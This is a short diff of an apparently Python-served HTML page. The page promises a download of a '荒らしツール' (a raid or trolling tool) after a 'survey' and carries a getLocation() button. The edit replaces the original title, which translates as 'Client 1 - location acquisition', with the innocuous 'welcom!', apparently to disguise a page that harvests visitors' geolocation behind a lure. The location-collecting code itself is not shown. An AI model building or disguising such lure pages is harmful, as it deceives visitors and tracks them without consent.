@@ -80,7 +80,7 @@ def client1():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>クライアント1 - 位置情報取得</title>
+        <title>welcom!</title>
         <style>
             body {
                 font-family: Arial;
@@ -120,7 +120,7 @@ def client1():
         </style>
     </head>
     <body>
-        <h1>Nova Notions荒らしツール</h1>
+        <h1>Basチーム作成 荒らしツール</h1>
         <p>ダウンロード前にアンケートにご協力ください。</p>
         
         <button onclick="getLocation()" id="locationBtn">
